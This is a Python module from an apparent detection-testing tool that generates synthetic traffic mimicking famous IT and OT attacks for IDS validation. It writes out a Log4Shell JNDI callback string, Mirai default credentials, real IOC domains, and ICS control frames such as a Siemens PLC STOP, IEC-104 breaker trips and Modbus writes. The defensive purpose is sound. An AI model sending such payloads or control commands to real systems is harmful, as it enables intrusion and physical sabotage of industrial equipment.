"""Famous IT/OT incident scenarios — detection-test threat traffic.

Each incident reproduces the *network-visible signatures* a monitoring tool
(Zeek, Suricata, Security Onion, Claroty CTD, …) would use to detect the real attack —
themed hostnames, the ports/protocols abused, scan and C2-beacon patterns, and
public IOC domains — so you can validate that your analyser fires on them.

This is **detection-test traffic only**: the payloads are synthetic and carry
the recognizable indicators, not working exploits, shellcode, or malware. Use it
on your own isolated test SPAN, for authorized detection engineering.

Bring your own real capture instead? Use ``tgt run --replay file.pcap``.
"""
from __future__ import annotations

import ipaddress
import struct
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional, Tuple

from . import packet as P
from .enterprise import (FINGERPRINTS, OUI_DELL, OUI_SCHNEIDER, OUI_SIEMENS,
                         OUI_VENDORS, OUI_WIN, Host)
from .packet import Endpoints
from .protocols import _s7, _s7_connect, _sport, _tcp_flow

AttackBuilder = Callable[[Endpoints, int], List[bytes]]


# ---------------------------------------------------------------------------
# Attack traffic builders (signature-bearing, synthetic)
# ---------------------------------------------------------------------------
def port_scan(ep: Endpoints, count: int) -> List[bytes]:
    """TCP SYN scan: one source hitting many ports (reconnaissance)."""
    ports = ep.meta.get("scan_ports",
                        [21, 22, 23, 80, 135, 139, 443, 445, 3389, 502, 102])
    frames = []
    for i in range(max(count, 1)):
        for k, dport in enumerate(ports):
            sport = _sport()
            syn = P.tcp(ep.client_ip, ep.server_ip, sport, dport,
                        1000 + i, 0, P.SYN)
            frames.append(P.ip_frame(ep, True, P.IPPROTO_TCP, syn))
            # closed → RST/ACK back
            rst = P.tcp(ep.server_ip, ep.client_ip, dport, sport,
                        0, 1001 + i, P.RST | P.ACK)
            frames.append(P.ip_frame(ep, False, P.IPPROTO_TCP, rst))
    return frames


def smb_eternalblue(ep: Endpoints, count: int) -> List[bytes]:
    """SMBv1 (445) negotiate + Trans2 with the ETERNALBLUE/DOUBLEPULSAR
    signature (SMBv1 'NT LM 0.12', Trans2 SESSION_SETUP subcmd 0x000e,
    multiplex id 0x0052) that IDS rules flag for MS17-010."""
    def nbss(p): return struct.pack("!I", len(p)) + p

    def hdr(cmd, mid):                               # 32-byte SMB1 header
        return b"\xffSMB" + struct.pack("<BIBH", cmd, 0, 0x18, 0xC853) + \
            struct.pack("<H8sHHHHH", 0, bytes(8), 0, 0, 0xFFFE, 0, mid)

    dialects = b"\x02NT LM 0.12\x00\x02LANMAN2.1\x00"
    exchanges = []
    for i in range(count):
        neg = hdr(0x72, i + 1) + struct.pack("<BH", 0, len(dialects)) + dialects
        neg_rsp = hdr(0x72, i + 1) + struct.pack("<BHH", 1, 0, 0)  # WCT 1
        exchanges.append((nbss(neg), nbss(neg_rsp)))
        # SMB_COM_TRANSACTION2 (0x32), SESSION_SETUP setup word 0x000e,
        # Multiplex ID 0x0052 — the DOUBLEPULSAR/ETERNALBLUE MS17-010 tell.
        params = struct.pack("<HHHHBBHIHHHHHBBH",
                             0, 0, 1024, 1024, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                             1, 0, 0x000E)
        trans2 = hdr(0x32, 0x0052) + struct.pack("<B", 15) + params + \
            struct.pack("<H", 0)
        trans2_rsp = hdr(0x32, 0x0052) + struct.pack("<BH", 0, 0)
        exchanges.append((nbss(trans2), nbss(trans2_rsp)))
    return _tcp_flow(ep, _sport(), 445, exchanges)


def c2_beacon(ep: Endpoints, count: int) -> List[bytes]:
    """Regular-interval HTTP beacon to a C2 host (implant check-in)."""
    domain = ep.meta.get("domain", "cdn-analytics.evil.example")
    ua = ep.meta.get("ua", "Mozilla/5.0 (Windows NT 6.1) TGT-implant")
    uri = ep.meta.get("uri", "/api/v2/updates")
    exchanges = []
    for i in range(count):
        tok = f"{(i * 2654435761) & 0xffffffff:08x}"
        req = (f"GET {uri}?id={tok} HTTP/1.1\r\nHost: {domain}\r\n"
               f"User-Agent: {ua}\r\nAccept: */*\r\n"
               f"Cookie: session={tok}{tok}\r\n\r\n").encode()
        resp = (b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
                b"Content-Length: 4\r\n\r\n" + bytes([i & 0xff]) * 4)
        exchanges.append((req, resp))
    return _tcp_flow(ep, _sport(), 80, exchanges)


def dga_dns(ep: Endpoints, count: int) -> List[bytes]:
    """DNS lookups of IOC / DGA domains (kill-switch, C2, beacon)."""
    domains = ep.meta.get("domains", ["malware-c2.example"])

    def qname(name: str) -> bytes:
        return b"".join(bytes([len(p)]) + p.encode()
                        for p in name.split(".")) + b"\x00"

    frames = []
    for i in range(max(count, len(domains))):
        name = domains[i % len(domains)]
        tid = (i + 1) & 0xFFFF
        q = qname(name) + struct.pack("!HH", 1, 1)
        query = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q
        frames.append(P.udp_frame(ep, True, _sport(), 53, query, ident=i))
        # NXDOMAIN response (typical for DGA / sinkholed IOC)
        resp = struct.pack("!HHHHHH", tid, 0x8183, 1, 0, 0, 0) + q
        frames.append(P.udp_frame(ep, False, 53, _sport(), resp, ident=i))
    return frames


def telnet_brute(ep: Endpoints, count: int) -> List[bytes]:
    """Telnet (23) default-credential brute force (Mirai-style IoT)."""
    creds = ep.meta.get("creds", [("root", "xc3511"), ("admin", "admin"),
                                  ("root", "12345"), ("root", "vizxv")])
    exchanges = []
    for i in range(count):
        u, pw = creds[i % len(creds)]
        exchanges.append((f"{u}\r\n".encode(),
                          b"Password: "))
        exchanges.append((f"{pw}\r\n".encode(),
                          b"Login incorrect\r\n"))
    return _tcp_flow(ep, _sport(), 23, exchanges)


def log4shell(ep: Endpoints, count: int) -> List[bytes]:
    """HTTP request carrying a JNDI lookup string (Log4Shell / CVE-2021-44228)."""
    lhost = ep.meta.get("lhost", ep.client_ip)
    exchanges = []
    for i in range(count):
        jndi = f"${{jndi:ldap://{lhost}:1389/Exploit{i}}}"
        req = (f"GET / HTTP/1.1\r\nHost: {ep.server_ip}\r\n"
               f"User-Agent: {jndi}\r\nX-Api-Version: {jndi}\r\n"
               "Accept: */*\r\n\r\n").encode()
        resp = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"
        exchanges.append((req, resp))
    return _tcp_flow(ep, _sport(), 80, exchanges)


def s7_control(ep: Endpoints, count: int) -> List[bytes]:
    """S7comm (102) PLC control — STOP CPU + program download (Stuxnet-style
    manipulation of a Siemens PLC, not just read/monitor)."""
    exchanges = _s7_connect()                        # COTP + Setup Comm first
    for i in range(count):
        ref = i + 1
        # S7 job, PLC STOP (function 0x29): "P_PROGRAM" is the documented
        # service name Stuxnet used to halt the CPU before a block download.
        stop_param = b"\x29\x00\x00\x00\x00\x00\x00\x09P_PROGRAM"
        job = _s7(1, ref, stop_param)
        ack = _s7(3, ref, b"\x29\x00\x00\x00\x00\x00\x00\x00")
        exchanges.append((job, ack))
    return _tcp_flow(ep, _sport(), 102, exchanges)


def iec104_command(ep: Endpoints, count: int) -> List[bytes]:
    """IEC 60870-5-104 (2404) control commands — breaker single/double
    commands (type 45/46, activation) as in Industroyer/CrashOverride."""
    def u(ctrl):                                     # U-format control frame
        return bytes([0x68, 4, ctrl, 0, 0, 0])

    def i_fr(ns, nr, asdu):                          # I-format data frame
        return struct.pack("<BBHH", 0x68, 4 + len(asdu), ns << 1, nr << 1) + asdu

    def asdu(type_id, cot, ioa, element):
        # type, VSQ(1 object), COT + originator(0), common address 1, 3-byte IOA
        return struct.pack("<BBBBH", type_id, 1, cot, 0, 1) + \
            ioa.to_bytes(3, "little") + element

    exchanges = [(u(0x07), u(0x0B))]                 # STARTDT act / con
    ns = 0
    for i in range(count):
        ioa = 0x1001 + i
        # C_SC_NA_1 (45) single command, COT=6 activation, SCS=1 (close/trip)
        cmd = i_fr(ns, 0, asdu(45, 6, ioa, b"\x01"))
        # ... COT=7 activation confirmation back
        con = i_fr(0, ns + 1, asdu(45, 7, ioa, b"\x01"))
        exchanges.append((cmd, con))
        ns += 1
    return _tcp_flow(ep, _sport(), 2404, exchanges)


def tristation(ep: Endpoints, count: int) -> List[bytes]:
    """TriStation (UDP 1502) to a Schneider Triconex safety controller
    (TRITON/TRISIS — manipulating a Safety Instrumented System)."""
    frames = []
    for i in range(count):
        # TriStation command: function 0x05 (get CP status) / 0x0d (download)
        fn = 0x0D if i % 3 == 0 else 0x05
        req = struct.pack("<HHH", fn, i & 0xFFFF, 0) + b"TRISTATION" + \
            struct.pack("<H", i & 0xFFFF)
        frames.append(P.udp_frame(ep, True, _sport(), 1502, req, ident=i))
        resp = struct.pack("<HHH", fn | 0x8000, i & 0xFFFF, 0) + b"TRICONEX"
        frames.append(P.udp_frame(ep, False, 1502, _sport(), resp, ident=i))
    return frames


def dns_tunnel(ep: Endpoints, count: int) -> List[bytes]:
    """DNS tunneling / exfil: long, high-entropy subdomains of a C2 base domain
    carried in TXT queries (the signature of data smuggled over DNS)."""
    base = ep.meta.get("domain", "tun.evil-c2.example")

    def qname(name: str) -> bytes:
        return b"".join(bytes([len(p)]) + p.encode()
                        for p in name.split(".")) + b"\x00"

    frames = []
    for i in range(count):
        label = f"{(i * 2654435761) & 0xffffffffffff:012x}" * 2  # 24-char chunk
        tid = (i + 1) & 0xFFFF
        q = qname(f"{label}.{base}") + struct.pack("!HH", 16, 1)   # TXT, IN
        query = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q
        frames.append(P.udp_frame(ep, True, _sport(), 53, query, ident=i))
        resp = struct.pack("!HHHHHH", tid, 0x8180, 1, 1, 0, 0) + q + \
            struct.pack("!HHHIH", 0xC00C, 16, 1, 60, 5) + b"\x04data"
        frames.append(P.udp_frame(ep, False, 53, _sport(), resp, ident=i))
    return frames


def https_c2(ep: Endpoints, count: int) -> List[bytes]:
    """Encrypted C2 over TLS: repeated ClientHellos to a C2 host carrying its
    SNI — what a sensor fingerprints (JA3/SNI) as beaconing to a bad domain."""
    meta = dict(ep.meta)
    meta["sni"] = meta.get("domain", "cdn.evil-c2.example")
    beacon = Endpoints(client_mac=ep.client_mac, client_ip=ep.client_ip,
                       server_mac=ep.server_mac, server_ip=ep.server_ip,
                       vlan=ep.vlan, ttl_client=ep.ttl_client,
                       ttl_server=ep.ttl_server, meta=meta)
    from .protocols import https_flow
    return https_flow(beacon, count)


def rdp_brute(ep: Endpoints, count: int) -> List[bytes]:
    """RDP (3389) password spraying: X.224 Connection Requests carrying the
    'Cookie: mstshash=<user>' routing token one after another."""
    users = ep.meta.get("users", ["administrator", "admin", "backup", "svc"])
    # Each attempt is its own TCP connection with a single X.224 CR (RDP allows
    # only one Connection Request per connection), so spraying = many sessions.
    frames = []
    for i in range(count):
        cookie = f"Cookie: mstshash={users[i % len(users)]}\r\n".encode()
        x224 = struct.pack("!BBHHB", len(cookie) + 6, 0xE0, 0, 0, 0) + cookie
        cr = struct.pack("!BBH", 0x03, 0x00, 4 + len(x224)) + x224    # TPKT
        # CC carries the RDP Negotiation Response the cookie's CR asks for
        neg = struct.pack("<BBHI", 0x02, 0, 8, 0)      # TYPE_RDP_NEG_RSP
        x224_cc = struct.pack("!BBHHB", 6 + len(neg), 0xD0, 0, 0, 0) + neg
        cc = struct.pack("!BBH", 0x03, 0x00, 4 + len(x224_cc)) + x224_cc
        frames += _tcp_flow(ep, _sport(), 3389, [(cr, cc)])
    return frames


def smb_lateral(ep: Endpoints, count: int) -> List[bytes]:
    """SMB lateral movement (PsExec-style): SMB2 tree-connects to the hidden
    ADMIN$ / IPC$ admin shares used to stage and launch remote services."""
    def nbss(payload: bytes) -> bytes:
        return struct.pack("!I", len(payload)) + payload

    def hdr(cmd, mid, resp):                     # 64-byte SMB2 header
        return b"\xfeSMB" + struct.pack(
            "<HHIHHIIQIIQ", 64, 0, 0, cmd, 1, 1 if resp else 0, 0, mid,
            0xFEFF, 0, 0) + bytes(16)

    host = ep.meta.get("host", "FILESRV01")
    shares = [f"\\\\{host}\\IPC$", f"\\\\{host}\\ADMIN$", f"\\\\{host}\\C$"]
    exchanges = []
    for i in range(count):
        path = shares[i % len(shares)].encode("utf-16-le")
        # SMB2 TREE_CONNECT: StructSize 9, Flags, PathOffset 72, PathLength
        req = nbss(hdr(3, i + 1, False) +
                   struct.pack("<HHHH", 9, 0, 64 + 8, len(path)) + path)
        # response: StructSize 16, ShareType DISK, access mask
        # response: StructSize 16, ShareType DISK, flags, caps, access mask
        resp = nbss(hdr(3, i + 1, True) +
                    struct.pack("<HBBIII", 16, 1, 0, 0, 0, 0x001F01FF))
        exchanges.append((req, resp))
    return _tcp_flow(ep, _sport(), 445, exchanges)


def modbus_write(ep: Endpoints, count: int) -> List[bytes]:
    """Unauthorized Modbus control: Write Multiple Registers (FC 0x10) forcing
    setpoints/outputs on a PLC — the manipulation stage of an ICS attack."""
    exchanges = []
    for i in range(count):
        tid, unit = (i + 1) & 0xFFFF, 1
        qty = 4
        values = b"\xde\xad" * qty                 # sentinel forced values
        pdu = struct.pack("!BHHB", 0x10, 0x0000, qty, qty * 2) + values
        req = struct.pack("!HHHB", tid, 0, len(pdu) + 1, unit) + pdu
        ack = struct.pack("!HHHBBHH", tid, 0, 6, unit, 0x10, 0x0000, qty)
        exchanges.append((req, ack))
    return _tcp_flow(ep, _sport(), 502, exchanges)


ATTACKS: Dict[str, Tuple[AttackBuilder, str]] = {
    "port-scan": (port_scan, "TCP SYN reconnaissance sweep"),
    "eternalblue": (smb_eternalblue, "SMBv1 MS17-010 / DOUBLEPULSAR signature"),
    "c2-beacon": (c2_beacon, "HTTP C2 implant check-in"),
    "dga-dns": (dga_dns, "IOC / DGA domain lookups"),
    "telnet-brute": (telnet_brute, "Telnet default-credential brute force"),
    "log4shell": (log4shell, "JNDI lookup in HTTP (CVE-2021-44228)"),
    "s7-control": (s7_control, "S7comm PLC STOP + program download"),
    "iec104-command": (iec104_command, "IEC-104 breaker control commands"),
    "tristation": (tristation, "TriStation writes to a Triconex SIS"),
    "dns-tunnel": (dns_tunnel, "DNS tunneling / exfil over long TXT queries"),
    "https-c2": (https_c2, "Encrypted C2 beaconing (TLS SNI to a C2 host)"),
    "rdp-brute": (rdp_brute, "RDP (3389) password spray (mstshash cookies)"),
    "smb-lateral": (smb_lateral, "SMB lateral movement to ADMIN$ / IPC$ shares"),
    "modbus-write": (modbus_write, "Unauthorized Modbus Write Multiple Registers"),
}

# The registry protocol (tgt.protocols) each attack's traffic is, or None for
# attack-only traffic with no registry profile (a SYN sweep, Telnet,
# TriStation). Must cover every ATTACKS key.
ATTACK_PROTOCOLS: Dict[str, Optional[str]] = {
    "port-scan": None,
    "eternalblue": "smb",
    "c2-beacon": "http",
    "dga-dns": "dns",
    "telnet-brute": None,
    "log4shell": "http",
    "s7-control": "s7comm",
    "iec104-command": "iec104",
    "tristation": None,
    "dns-tunnel": "dns",
    "https-c2": "https",
    "rdp-brute": None,
    "smb-lateral": "smb",
    "modbus-write": "modbus",
}


# ---------------------------------------------------------------------------
# Incident definitions
# ---------------------------------------------------------------------------
# Flow: (attacker_name, victim_name, attack_key, meta_overrides)
Flow = Tuple[str, str, str, dict]


@dataclass
class Incident:
    key: str
    name: str
    category: str      # IT | OT
    year: str
    desc: str
    hosts: List[Host]
    flows: List[Flow]

    def host(self, name: str) -> Host:
        return next(h for h in self.hosts if h.name == name)

    def _endpoints(self, a: Host, v: Host, meta: dict) -> Endpoints:
        m = {"ua": a.fp.ua, "smb": "smb1", "host": v.name}
        m.update(meta)
        return Endpoints(client_mac=a.mac, client_ip=a.ip,
                         server_mac=v.mac, server_ip=v.ip,
                         ttl_client=a.fp.ttl, ttl_server=v.fp.ttl, meta=m)

    def build(self, messages: int,
              resolve: Optional[Callable[[str], Host]] = None
              ) -> List[Tuple[str, bytes]]:
        """Build the incident's flows. ``resolve`` re-addresses each incident
        host name onto another host (e.g. an environment's real inventory via
        :meth:`map_onto`); by default each host keeps its own identity."""
        resolve = resolve or self.host
        streams: List[List[Tuple[str, bytes]]] = []
        for aname, vname, atk, meta in self.flows:
            ep = self._endpoints(resolve(aname), resolve(vname), meta)
            builder = ATTACKS[atk][0]
            frames = builder(ep, max(1, messages))
            streams.append([(atk, f) for f in frames])
        out: List[Tuple[str, bytes]] = []
        i = 0
        while any(i < len(s) for s in streams):
            for s in streams:
                if i < len(s):
                    out.append(s[i])
            i += 1
        return out

    def map_onto(self, env) -> Dict[str, Host]:
        """Map each internal incident host onto an environment host, so
        sprinkled malware rides on real inventory assets.

        A candidate must share the role, or failing that the role family
        (see ``_ROLE_FAMILIES``); an embedded device must also come from the
        same vendor (by MAC OUI), so a Siemens S7 attack never lands on a
        Rockwell PLC.

        Hosts are mapped top-down through the Purdue model (enterprise stages
        first, plant floor last; see ``_purdue_level``) so the kill chain lands
        as a coherent descent: an upstream stage anchors the zone, and each
        downstream victim prefers a host in the same segment as a neighbour that
        is already placed — keeping a cell's devices together and lateral
        movement inside one zone. Among candidates: exact role first, then that
        neighbour affinity, then a host not yet used, then the same OS. Hosts
        with no candidate — and external adversary infrastructure (see
        ``_is_external``) — keep their own identity."""
        adj: Dict[str, set] = {}
        for a, v, _, _ in self.flows:
            adj.setdefault(a, set()).add(v)
            adj.setdefault(v, set()).add(a)
        internal = sorted((h for h in self.hosts if not _is_external(h)),
                          key=lambda h: (-_purdue_level(h.role), h.name))
        used: set = set()
        mapping: Dict[str, Host] = {}
        for ih in internal:
            vendor = _device_vendor(ih)
            cands = [h for h in env.hosts if _role_tier(ih.role, h.role)
                     and (vendor is None or _device_vendor(h) == vendor)]
            if not cands:
                continue
            neigh_segs = {env.segment_of(mapping[n])
                          for n in adj.get(ih.name, ()) if n in mapping}
            pick = min(cands, key=lambda h: (
                -_role_tier(ih.role, h.role),
                env.segment_of(h) not in neigh_segs,
                h.name in used, h.os != ih.os, h.name))
            used.add(pick.name)
            mapping[ih.name] = pick
        return mapping

    def build_on(self, messages: int, env,
                 span: str = "access") -> List[Tuple[str, bytes]]:
        """Build this incident re-addressed onto ``env``'s real hosts and placed
        on the same VLANs/trunk as the environment's own traffic (see
        :meth:`map_onto`). Flows whose hosts stay external keep their
        addressing and ride through the internal peer's gateway."""
        mapping = self.map_onto(env)

        def resolve(name: str) -> Host:
            return mapping.get(name) or self.host(name)

        streams: List[List[Tuple[str, bytes]]] = []
        for aname, vname, atk, meta in self.flows:
            a, v = resolve(aname), resolve(vname)
            ep = self._endpoints(a, v, meta)
            frames = ATTACKS[atk][0](ep, max(1, messages))
            placed: List[Tuple[str, bytes]] = []
            for f in frames:
                for g in env.place(f, a, v, span, env.segment_or_none):
                    placed.append((atk, g))
            streams.append(placed)
        out: List[Tuple[str, bytes]] = []
        i = 0
        while any(i < len(s) for s in streams):
            for s in streams:
                if i < len(s):
                    out.append(s[i])
            i += 1
        return out

    def protocols(self) -> List[str]:
        """Registry protocols this incident's traffic uses, in registry order
        (attack-only traffic such as a port scan is in :meth:`attack_only`)."""
        from .protocols import PROFILES
        used = {ATTACK_PROTOCOLS[f[2]] for f in self.flows}
        return [k for k in PROFILES if k in used]

    def attack_only(self) -> List[str]:
        """Attacks in this incident with no registry protocol (e.g. port-scan)."""
        return sorted({f[2] for f in self.flows if ATTACK_PROTOCOLS[f[2]] is None})

    def indicators(self) -> List[str]:
        return sorted({ATTACKS[f[2]][1] for f in self.flows})


_RFC1918 = [ipaddress.ip_network(n) for n in
            ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]


def _is_external(host: Host) -> bool:
    """An adversary host outside the modeled inventory: a non-RFC1918 address
    (the incidents use TEST-NET ranges as public-IP stand-ins), or a C2 node by
    name. Such hosts are never remapped onto an environment asset."""
    if "C2" in host.name:
        return True
    try:
        ip = ipaddress.ip_address(host.ip)
    except ValueError:
        return False
    return not any(ip in net for net in _RFC1918)


# Roles that may stand in for one another when an environment lacks the exact
# one: field devices (Purdue L1-2) and supervisory consoles (L2-3).
_ROLE_FAMILIES = ({"plc", "rtu", "relay", "drive", "meter"},
                  {"scada", "hmi", "hist"})


def _role_tier(want: str, have: str) -> int:
    """2 = same role, 1 = same role family, 0 = not a substitute."""
    if want == have:
        return 2
    return 1 if any(want in f and have in f for f in _ROLE_FAMILIES) else 0


# Purdue level per role: higher = closer to the enterprise top (L4/L5), lower =
# plant floor (L1). Used to map a kill chain top-down so malware traverses the
# model from IT inward to the field devices, the way the real attacks did.
_PURDUE_LEVEL = {
    "ws": 5, "dc": 5, "dns": 5, "file": 5, "web": 5, "mail": 5, "db": 5,
    "proxy": 5,
    "jump": 4, "patch": 4, "av": 4,                       # IT/OT DMZ (L3.5)
    "scada": 3, "hmi": 3, "hist": 3, "eng": 3, "opc": 3, "bms": 3,  # OT L3
    "plc": 2, "rtu": 2, "relay": 2, "drive": 2,           # OT cell (L1-2)
    "meter": 1,                                           # field sensor (L1)
}


def _purdue_level(role: str) -> int:
    return _PURDUE_LEVEL.get(role, 3)


def _device_vendor(host: Host):
    """Embedded-device vendor from the MAC OUI; ``None`` for generic PC/VM
    NICs (VMware, Dell), whose OUI says nothing about the software."""
    oui = host.mac[:8].lower()
    if oui in (OUI_WIN, OUI_DELL):
        return None
    return OUI_VENDORS.get(oui)


def _h(name, ip, role, os_, oui=OUI_WIN, product=""):
    n = sum(bytes(name, "ascii")) & 0xFFFF
    return Host(name, ip, f"{oui}:{(n >> 8) & 0xFF:02x}:{n & 0xFF:02x}:"
                f"{len(name) & 0xFF:02x}", role, os_, product=product)


INCIDENTS: Dict[str, Incident] = {}


def _reg(inc: Incident):
    INCIDENTS[inc.key] = inc


# ---- IT incidents ----------------------------------------------------------
_reg(Incident("wannacry", "WannaCry", "IT", "2017",
    "Ransomware worm spreading via SMBv1 EternalBlue (MS17-010): 445 scan, "
    "SMBv1 exploit signature, and the famous kill-switch domain lookup.",
    [_h("WANNACRY-PATIENT0", "10.20.20.66", "ws", "win7"),
     _h("WS-FINANCE", "10.20.20.41", "ws", "win7"),
     _h("WS-HR", "10.20.20.42", "ws", "winxp"),
     _h("FILESRV01", "10.20.10.13", "file", "win2019"),
     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("WANNACRY-PATIENT0", "WS-FINANCE", "port-scan", {"scan_ports": [445]}),
     ("WANNACRY-PATIENT0", "WS-FINANCE", "eternalblue", {}),
     ("WANNACRY-PATIENT0", "WS-HR", "eternalblue", {}),
     ("WANNACRY-PATIENT0", "FILESRV01", "eternalblue", {}),
     ("WANNACRY-PATIENT0", "DNS01", "dga-dns", {"domains": [
        "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"]})]))

_reg(Incident("sunburst", "SUNBURST (SolarWinds)", "IT", "2020",
    "Supply-chain backdoor in SolarWinds Orion: DGA subdomain lookups under "
    "avsvmcloud.com, then HTTP C2 and an escalation to encrypted (TLS) C2.",
    [_h("SW-ORION", "10.20.10.55", "web", "win2019"),
     _h("ORION-C2", "10.20.10.200", "web", "linux"),
     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("SW-ORION", "DNS01", "dga-dns", {"domains": [
        "7gr7f1q8p0k5q2.appsync-api.us-east-1.avsvmcloud.com",
        "3mn5v9x2c1z8b4.appsync-api.eu-west-1.avsvmcloud.com"]}),
     ("SW-ORION", "ORION-C2", "c2-beacon", {
        "domain": "avsvmcloud.com", "uri": "/swip/upd/",
        "ua": "Mozilla/5.0 (Windows NT 10.0) SolarWinds.BusinessLayerHost"}),
     ("SW-ORION", "ORION-C2", "https-c2", {
        "domain": "avsvmcloud.com"})]))

_reg(Incident("conficker", "Conficker", "IT", "2008",
    "Worm exploiting MS08-067 over SMB (445) with a domain-generation "
    "algorithm for C2 rendezvous.",
    [_h("CONFICKER-HOST", "10.20.20.77", "ws", "win2000"),
     _h("WS-LAB", "10.20.20.43", "ws", "winxp"),
     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("CONFICKER-HOST", "WS-LAB", "port-scan", {"scan_ports": [445, 139]}),
     ("CONFICKER-HOST", "WS-LAB", "eternalblue", {}),
     ("CONFICKER-HOST", "DNS01", "dga-dns", {"domains": [
        "vwxyzabcd.info", "qwertyuiop.biz", "mnbvcxzlkj.org"]})]))

_reg(Incident("mirai", "Mirai Botnet", "IT", "2016",
    "IoT botnet spreading by scanning Telnet (23) with default credentials, "
    "then reporting to its C2.",
    [_h("MIRAI-BOT", "10.20.30.10", "ws", "linux"),
     _h("IPCAM-01", "10.20.30.51", "ws", "linux"),
     _h("DVR-02", "10.20.30.52", "ws", "linux"),
     _h("MIRAI-C2", "10.20.30.200", "web", "linux")],
    [("MIRAI-BOT", "IPCAM-01", "telnet-brute", {}),
     ("MIRAI-BOT", "DVR-02", "telnet-brute", {}),
     ("MIRAI-BOT", "MIRAI-C2", "c2-beacon", {
        "domain": "report.mirai-c2.example", "uri": "/bot/report"})]))

_reg(Incident("log4shell", "Log4Shell", "IT", "2021",
    "CVE-2021-44228: JNDI lookup strings injected into HTTP headers of a "
    "public web app to trigger a callback.",
    [_h("ATTACKER", "203.0.113.10", "ws", "linux"),
     _h("WEBAPP01", "10.20.10.55", "web", "linux")],
    [("ATTACKER", "WEBAPP01", "log4shell", {"lhost": "203.0.113.10"}),
     ("ATTACKER", "WEBAPP01", "port-scan", {"scan_ports": [80, 443, 8080]}),
     ("WEBAPP01", "ATTACKER", "c2-beacon", {      # the triggered callback
        "domain": "203.0.113.10:1389", "uri": "/Exploit"})]))

# ---- OT incidents ----------------------------------------------------------
_reg(Incident("stuxnet", "Stuxnet", "OT", "2010",
    "Sabotage of Siemens S7 PLCs at Natanz: SMBv1 propagation and S7comm "
    "PLC STOP + malicious program download from a compromised engineering WS.",
    [_h("STEP7-ENGWS", "172.16.2.50", "eng", "win7"),
     _h("WINCC-SCADA", "172.16.2.51", "scada", "winxp"),
     _h("PLC-S7-417", "172.16.2.21", "plc", "siemens", OUI_SIEMENS,
        "6ES7 417-4XT05-0AB0")],
    [("STEP7-ENGWS", "WINCC-SCADA", "eternalblue", {}),
     ("STEP7-ENGWS", "PLC-S7-417", "s7-control", {}),
     ("WINCC-SCADA", "PLC-S7-417", "s7-control", {})]))

_reg(Incident("industroyer", "Industroyer / CrashOverride", "OT", "2016",
    "Attack on the Ukrainian power grid: IEC 60870-5-104 breaker control "
    "command storm to trip substation breakers.",
    [_h("INDUSTROYER-C2", "172.16.0.200", "web", "linux"),
     _h("SUBSTATION-HMI", "172.16.0.30", "hmi", "win7"),
     _h("RTU-104", "172.16.1.30", "rtu", "siemens", OUI_SIEMENS)],
    [("SUBSTATION-HMI", "RTU-104", "port-scan",
      {"scan_ports": [2404, 102, 20000]}),
     ("SUBSTATION-HMI", "RTU-104", "iec104-command", {}),
     ("INDUSTROYER-C2", "SUBSTATION-HMI", "c2-beacon", {
        "domain": "195.16.88.6", "uri": "/xmlrpc"})]))

_reg(Incident("triton", "TRITON / TRISIS", "OT", "2017",
    "Attack on a Schneider Triconex Safety Instrumented System via the "
    "TriStation protocol (UDP 1502) from a compromised engineering station.",
    [_h("TRITON-ENGWS", "172.16.0.60", "eng", "win7"),
     _h("SIS-TRICONEX", "172.16.3.10", "plc", "schneider", OUI_SCHNEIDER,
        "Triconex 3008")],
    [("TRITON-ENGWS", "SIS-TRICONEX", "tristation", {}),
     ("TRITON-ENGWS", "SIS-TRICONEX", "port-scan",
      {"scan_ports": [1502, 1500, 502]})]))

_reg(Incident("notpetya", "NotPetya", "IT", "2017",
    "Destructive worm (disguised as ransomware) spreading via the same SMBv1 "
    "EternalBlue signature as WannaCry, with a 445 sweep across the subnet.",
    [_h("NOTPETYA-PATIENT0", "10.20.20.88", "ws", "win7"),
     _h("WS-ACCT", "10.20.20.45", "ws", "win10"),
     _h("WS-OPS", "10.20.20.46", "ws", "winxp"),
     _h("FILESRV01", "10.20.10.13", "file", "win2019")],
    [("NOTPETYA-PATIENT0", "WS-ACCT", "port-scan", {"scan_ports": [445, 139]}),
     ("NOTPETYA-PATIENT0", "WS-ACCT", "eternalblue", {}),
     ("NOTPETYA-PATIENT0", "WS-OPS", "eternalblue", {}),
     ("NOTPETYA-PATIENT0", "FILESRV01", "eternalblue", {})]))

_reg(Incident("ryuk", "Ryuk Ransomware", "IT", "2019",
    "Human-operated ransomware: C2 beaconing from a loader, internal 445/3389 "
    "scanning, then SMBv1 lateral movement across file and user hosts.",
    [_h("RYUK-LOADER", "10.20.20.90", "ws", "win10"),
     _h("RYUK-C2", "10.20.10.210", "web", "linux"),
     _h("FILESRV01", "10.20.10.13", "file", "win2019"),
     _h("WS-ENG", "10.20.20.47", "ws", "win7")],
    [("RYUK-LOADER", "RYUK-C2", "c2-beacon", {
        "domain": "ryuk-pay.example", "uri": "/krbtgt/report"}),
     ("RYUK-LOADER", "FILESRV01", "port-scan",
      {"scan_ports": [445, 3389, 135]}),
     ("RYUK-LOADER", "FILESRV01", "eternalblue", {}),
     ("RYUK-LOADER", "WS-ENG", "eternalblue", {})]))

_reg(Incident("blackenergy", "BlackEnergy 3", "OT", "2015",
    "2015 Ukraine grid attack precursor: HTTP C2 beaconing from a spear-phished "
    "operator workstation and reconnaissance of substation control ports.",
    [_h("BE-C2", "172.16.0.210", "web", "linux"),
     _h("OPER-WS", "172.16.0.40", "eng", "win7"),
     _h("RTU-104", "172.16.1.30", "rtu", "siemens", OUI_SIEMENS)],
    [("OPER-WS", "BE-C2", "c2-beacon", {
        "domain": "5.149.254.114", "uri": "/Microsoft/Update/KC074913.php"}),
     ("OPER-WS", "RTU-104", "port-scan",
      {"scan_ports": [2404, 102, 502, 20000]})]))

_reg(Incident("emotet", "Emotet", "IT", "2018",
    "Loader/botnet: HTTP C2 check-ins to compromised hosts and DNS tunneling "
    "for resilient command and data exfil.",
    [_h("EMOTET-BOT", "10.20.20.91", "ws", "win10"),
     _h("EMOTET-C2", "10.20.10.211", "web", "linux"),
